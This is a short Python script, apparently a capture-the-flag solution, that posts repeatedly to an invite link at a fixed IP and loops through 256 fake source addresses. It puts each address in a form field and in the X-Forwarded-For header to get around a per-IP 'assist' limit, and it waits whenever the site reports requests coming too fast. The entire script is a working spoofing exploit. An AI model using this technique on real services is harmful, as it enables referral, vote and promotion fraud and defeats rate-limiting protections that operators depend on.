import requests
import time

for i in range(256):
    while True:
        r = requests.post(
            'http://202.38.93.111:10888/invite/bc6dd5d1-0e19-4e9f-a142-c55537d2c6f2',
            data={ 'ip': f'{i}.1.1.1' },
            headers={ 'X-Forwarded-For': f'{i}.1.1.1' })

        if '助力成功！' in r.text:
            print(f'Success {i}')
            break
        elif '操作速度太快了' in r.text:
            print(f'Too fast, sleep')
            time.sleep(1)